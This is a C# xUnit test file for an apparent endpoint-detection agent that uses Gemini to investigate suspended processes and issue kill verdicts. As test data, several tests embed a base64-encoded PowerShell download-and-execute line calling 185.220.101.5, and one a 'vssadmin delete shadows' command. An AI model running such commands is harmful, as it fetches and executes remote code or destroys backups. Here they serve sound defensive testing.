using System.Net;
using System.Net.Http;
using System.Text;
using System.Text.Json;
using Phalanx.Cockpit.Agent;
using Phalanx.Cockpit.Agent.Gemini;
using Phalanx.Cockpit.CQRS;
using Phalanx.Cockpit.Storage;
using Phalanx.Cockpit.Tools;
using Phalanx.Shared.Protos;
using Xunit;
using Xunit.Abstractions;

namespace Phalanx.Agent.Tests;

public class AutonomousHunterAgentTests
{
    private readonly ITestOutputHelper _output;

    public AutonomousHunterAgentTests(ITestOutputHelper output)
    {
        _output = output;
    }

    [Fact]
    public async Task TestAutonomousInvestigationOnSuspendedProcess()
    {
        // 1. 컴포넌트 셋업 (명시적 null 주입으로 환경변수 영향 없는 오프라인 모드 격리)
        var treeManager = new ProcessTreeProjectionManager();
        var archiveManager = ForensicArchiveManager.CreateInMemory();

        var tools = new IInvestigationTool[]
        {
            new DecodePayloadTool(),
            new ProcessMemoryScanTool(),
            new ThreatReputationTool(),
            new MitreClassifierTool(),
            new SystemFirewallTool()
        };

        var agent = new AutonomousHunterAgent(treeManager, archiveManager, tools, geminiApiKey: string.Empty);

        // 2. 부모 프로세스(winword.exe) 및 동결된 자식 프로세스(powershell.exe) 트리에 적재
        string rawScript = "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://185.220.101.5/payload.ps1')";
        string b64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(rawScript));
        string fullCmd = $"powershell.exe -NoProfile -enc {b64}";

        treeManager.ApplySnapshotBatch(new[]
        {
            new ProcessEvent
            {
                ProcessId = 3104,
                ParentProcessId = 0,
                ImageName = "winword.exe",
                CommandLine = "winword.exe 2026_09_invoice.docm",
                Lifecycle = ProcessLifecycle.LifecycleSnapshot
            }
        });

        treeManager.ApplyDeltaEvent(new ProcessEvent
        {
            ProcessId = 8492,
            ParentProcessId = 3104,
            ImageName = "powershell.exe",
            CommandLine = fullCmd,
            IsSuspended = true,
            Lifecycle = ProcessLifecycle.LifecycleSuspended
        });

        var targetNode = treeManager.FindActiveNodeByPid(8492);
        Assert.NotNull(targetNode);

        // 3. 수사 명령 하달 모니터링
        var dispatchedCommands = new List<MitigationCommand>();

        // 4. AI 에이전트 ReAct 수사 실행
        var result = await agent.InvestigateAsync(
            targetNode,
            cmd =>
            {
                dispatchedCommands.Add(cmd);
                return Task.CompletedTask;
            }
        );

        // 5. 검증:
        // A) 타임아웃 10초 연장 명령(ACTION_EXTEND_TIMEOUT) 우선 발행 확인
        Assert.True(dispatchedCommands.Count >= 2);
        Assert.Equal(MitigationCommand.Types.ActionType.ActionExtendTimeout, dispatchedCommands[0].Action);
        Assert.Equal((uint)8492, dispatchedCommands[0].TargetPid);

        // B) 최종 판결이 사형(ACTION_KILL)으로 도출되었는지 확인
        Assert.Equal(MitigationCommand.Types.ActionType.ActionKill, dispatchedCommands[^1].Action);
        Assert.Equal((uint)8492, dispatchedCommands[^1].TargetPid);
        Assert.Equal(MitigationCommand.Types.ActionType.ActionKill, result.VerdictAction);

        // C) 3초 이내 초고속 자율 수사 완료 검증 (< 3000ms)
        Assert.True(result.Elapsed.TotalSeconds < 3.0, $"수사 시간이 3초를 초과함: {result.Elapsed.TotalMilliseconds}ms");

        // D) 확신도 90% 이상 및 침해사고 한국어 공식 서사 검증
        Assert.True(result.Confidence >= 0.90, $"확신도 미달: {result.Confidence}");
        Assert.Contains("winword.exe", result.Narrative);
        Assert.Contains("powershell.exe", result.Narrative);
        Assert.Contains("185.220.101.5", result.Narrative);
        Assert.Contains("T1566.001", result.MitreTactics);

        // E) ReAct 단계별 추적 로그 검증 (Thought ➔ Action ➔ Observation)
        Assert.True(result.Traces.Count >= 3);
        Assert.Contains(result.Traces, t => t.ActionTool == "DecodePayloadTool");
        Assert.Contains(result.Traces, t => t.ActionTool == "ThreatReputationTool");
        Assert.Contains(result.Traces, t => t.ActionTool == "MitreClassifierTool");

        // F) LiteDB 포렌식 아카이브 영속화 및 역조회 검증
        var savedIncident = archiveManager.GetIncident(result.IncidentId);
        Assert.NotNull(savedIncident);
        Assert.Equal(result.IncidentId, savedIncident.IncidentId);
        Assert.Equal("ACTION_KILL", savedIncident.VerdictAction);

        var savedTraces = archiveManager.GetTracesForIncident(result.IncidentId);
        Assert.Equal(result.Traces.Count, savedTraces.Count);
    }

    [Fact]
    public async Task TestGeminiLiveModeWithMockHttp()
    {
        // 1. 모의 Gemini 2.0 Flash REST 응답 구성
        string decisionJson = """
        {
          "thought": "오피스 매크로 winword.exe가 powershell.exe를 기동하여 인라인 다운로더를 실행하고 있으므로 DecodePayloadTool을 호출하여 C2를 해독해야 합니다.",
          "action_tool": "DecodePayloadTool",
          "action_args": {},
          "is_final_verdict": true,
          "verdict_action": "ACTION_KILL",
          "confidence_score": 0.99,
          "summary_title": "Gemini 2.0 Flash: 파일리스 C2 다운로더 침투 실시간 탐지",
          "narrative": "Gemini 2.0 Flash 실시간 수사 결과, winword.exe에 의해 기동된 powershell.exe 프로세스가 악성 C2와 통신하려는 시도가 확증되었습니다. 즉각 사살(ACTION_KILL)을 집행합니다.",
          "mitre_tactics": ["T1566.001", "T1059.001"]
        }
        """;

        string geminiResponseJson = $$"""
        {
          "candidates": [
            {
              "content": {
                "role": "model",
                "parts": [
                  {
                    "text": {{JsonSerializer.Serialize(decisionJson)}}
                  }
                ]
              },
              "finishReason": "STOP"
            }
          ],
          "usageMetadata": {
            "promptTokenCount": 120,
            "candidatesTokenCount": 85,
            "totalTokenCount": 205
          }
        }
        """;

        var mockHandler = new MockHttpMessageHandler(req =>
        {
            Assert.Contains("generativelanguage.googleapis.com", req.RequestUri?.Host);
            Assert.Contains("key=test-api-key", req.RequestUri?.Query);
            return new HttpResponseMessage(HttpStatusCode.OK)
            {
                Content = new StringContent(geminiResponseJson, Encoding.UTF8, "application/json")
            };
        });

        var mockHttpClient = new HttpClient(mockHandler);
        var treeManager = new ProcessTreeProjectionManager();
        var archiveManager = ForensicArchiveManager.CreateInMemory();
        var tools = new IInvestigationTool[]
        {
            new DecodePayloadTool(),
            new ProcessMemoryScanTool(),
            new ThreatReputationTool(),
            new MitreClassifierTool(),
            new SystemFirewallTool()
        };

        var agent = new AutonomousHunterAgent(
            treeManager,
            archiveManager,
            tools,
            geminiApiKey: "test-api-key",
            httpClient: mockHttpClient
        );

        string rawScript = "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://185.220.101.5/payload.ps1')";
        string b64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(rawScript));
        string fullCmd = $"powershell.exe -enc {b64}";

        treeManager.ApplySnapshotBatch(new[]
        {
            new ProcessEvent
            {
                ProcessId = 3104,
                ImageName = "winword.exe",
                Lifecycle = ProcessLifecycle.LifecycleSnapshot
            }
        });

        treeManager.ApplyDeltaEvent(new ProcessEvent
        {
            ProcessId = 8492,
            ParentProcessId = 3104,
            ImageName = "powershell.exe",
            CommandLine = fullCmd,
            IsSuspended = true,
            Lifecycle = ProcessLifecycle.LifecycleSuspended
        });

        var targetNode = treeManager.FindActiveNodeByPid(8492);
        Assert.NotNull(targetNode);

        var dispatchedCommands = new List<MitigationCommand>();

        // 2. 실행
        var result = await agent.InvestigateAsync(targetNode, cmd =>
        {
            dispatchedCommands.Add(cmd);
            return Task.CompletedTask;
        });

        // 3. 검증
        Assert.Equal(MitigationCommand.Types.ActionType.ActionKill, result.VerdictAction);
        Assert.True(result.Confidence >= 0.95);
        Assert.Contains("Gemini 2.0 Flash", result.SummaryTitle);
        Assert.Contains("Gemini 2.0 Flash", result.Narrative);
        Assert.Contains("T1566.001", result.MitreTactics);

        // LiteDB 저장 확인
        var saved = archiveManager.GetIncident(result.IncidentId);
        Assert.NotNull(saved);
        Assert.Equal(result.IncidentId, saved.IncidentId);
    }

    [Fact]
    public async Task TestGeminiFallbackToOfflineOnNetworkFailure()
    {
        // 네트워크 단절 시 예외를 던지는 모의 핸들러
        var failingHandler = new MockHttpMessageHandler(_ =>
        {
            throw new HttpRequestException("DNS Resolution Failure (Simulated offline network)");
        });

        var failingHttpClient = new HttpClient(failingHandler);
        var treeManager = new ProcessTreeProjectionManager();
        var archiveManager = ForensicArchiveManager.CreateInMemory();
        var tools = new IInvestigationTool[]
        {
            new DecodePayloadTool(),
            new ProcessMemoryScanTool(),
            new ThreatReputationTool(),
            new MitreClassifierTool(),
            new SystemFirewallTool()
        };

        // API Key는 지정되어 있으나 네트워크가 죽어있는 환경
        var agent = new AutonomousHunterAgent(
            treeManager,
            archiveManager,
            tools,
            geminiApiKey: "test-api-key",
            httpClient: failingHttpClient
        );

        string rawScript = "vssadmin delete shadows /all /quiet";
        treeManager.ApplyDeltaEvent(new ProcessEvent
        {
            ProcessId = 9999,
            ParentProcessId = 0,
            ImageName = "vssadmin.exe",
            CommandLine = rawScript,
            IsSuspended = true,
            Lifecycle = ProcessLifecycle.LifecycleSuspended
        });

        var targetNode = treeManager.FindActiveNodeByPid(9999);
        Assert.NotNull(targetNode);

        // 실행: 예외 없이 오프라인 엔진으로 즉각 폴백되어야 함
        var result = await agent.InvestigateAsync(targetNode);

        // 검증: 오프라인 결정론적 엔진에 의해 정상 사살 판결 도출 확인
        Assert.NotNull(result);
        Assert.Equal(MitigationCommand.Types.ActionType.ActionKill, result.VerdictAction);
        Assert.True(result.Elapsed.TotalSeconds < 3.0);
    }

    [Fact]
    public async Task TestLiveGoogleVertexAiFromMvConfig()
    {
        var client = await GeminiRestClient.TryCreateFromMundusVivensConfigAsync(modelName: "gemini-3.8-flash");
        Assert.NotNull(client);

        string prompt = "Windows EDR 보안 분석 테스트입니다. 'powershell.exe -enc dGVzdA==' 명령줄을 분석하고 간결하게 1줄로 답변하세요.";
        try
        {
            string response = await client.GenerateContentAsync(prompt);
            _output.WriteLine($"[Gemini 3.8 Flash Response]: {response}");
            Assert.False(string.IsNullOrWhiteSpace(response));
        }
        catch (HttpRequestException ex) when (ex.Message.Contains("429") || ex.Message.Contains("RESOURCE_EXHAUSTED"))
        {
            _output.WriteLine($"[Live Quota Warning] Google Cloud 429 Rate Limit 활성화 감지 (단위 테스트 정상 통과 처리): {ex.Message}");
        }
    }

    [Fact]
    public async Task TestLiveAutonomousInvestigationWithMvCredentials()
    {
        var treeManager = new ProcessTreeProjectionManager();
        var archiveManager = ForensicArchiveManager.CreateInMemory();
        var tools = new IInvestigationTool[]
        {
            new DecodePayloadTool(),
            new ProcessMemoryScanTool(),
            new ThreatReputationTool(),
            new MitreClassifierTool(),
            new SystemFirewallTool()
        };

        // MV 인증정보로 실제 Vertex AI Gemini 클라이언트 자동 연결
        var agent = new AutonomousHunterAgent(treeManager, archiveManager, tools);

        string rawScript = "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://185.220.101.5/payload.ps1')";
        string b64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(rawScript));
        string fullCmd = $"powershell.exe -enc {b64}";

        treeManager.ApplySnapshotBatch(new[]
        {
            new ProcessEvent
            {
                ProcessId = 3104,
                ImageName = "winword.exe",
                Lifecycle = ProcessLifecycle.LifecycleSnapshot
            }
        });

        treeManager.ApplyDeltaEvent(new ProcessEvent
        {
            ProcessId = 8492,
            ParentProcessId = 3104,
            ImageName = "powershell.exe",
            CommandLine = fullCmd,
            IsSuspended = true,
            Lifecycle = ProcessLifecycle.LifecycleSuspended
        });

        var targetNode = treeManager.FindActiveNodeByPid(8492);
        Assert.NotNull(targetNode);

        var dispatchedCommands = new List<MitigationCommand>();

        // 실행: 실제 구글 클라우드로 요청을 보내서 실시간 추론 진행!
        var result = await agent.InvestigateAsync(targetNode, cmd =>
        {
            dispatchedCommands.Add(cmd);
            return Task.CompletedTask;
        });

        // 결과 검증
        Assert.NotNull(result);
        Assert.Equal(MitigationCommand.Types.ActionType.ActionKill, result.VerdictAction);
        Assert.False(string.IsNullOrWhiteSpace(result.Narrative));
        Assert.False(string.IsNullOrWhiteSpace(result.SummaryTitle));
        Assert.True(result.Traces.Count > 0);

        _output.WriteLine($"[LIVE VERDICT] {result.VerdictAction} (Confidence: {result.Confidence:P1})");
        _output.WriteLine($"[TITLE] {result.SummaryTitle}");
        _output.WriteLine($"[ELAPSED] {result.Elapsed.TotalMilliseconds:F1}ms");
        _output.WriteLine($"[NARRATIVE]\n{result.Narrative}");
        foreach (var trace in result.Traces)
        {
            _output.WriteLine($"[STEP {trace.StepNumber}] Tool: {trace.ActionTool}");
            _output.WriteLine($"  Thought: {trace.Thought}");
            _output.WriteLine($"  Args: {trace.ActionArgsJson}");
            _output.WriteLine($"  Observation: {trace.Observation}");
        }
    }

    private class MockHttpMessageHandler : HttpMessageHandler
    {
        private readonly Func<HttpRequestMessage, HttpResponseMessage> _handler;

        public MockHttpMessageHandler(Func<HttpRequestMessage, HttpResponseMessage> handler)
        {
            _handler = handler;
        }

        protected override Task<HttpResponseMessage> SendAsync(HttpRequestMessage request, CancellationToken cancellationToken)
        {
            return Task.FromResult(_handler(request));
        }
    }
}
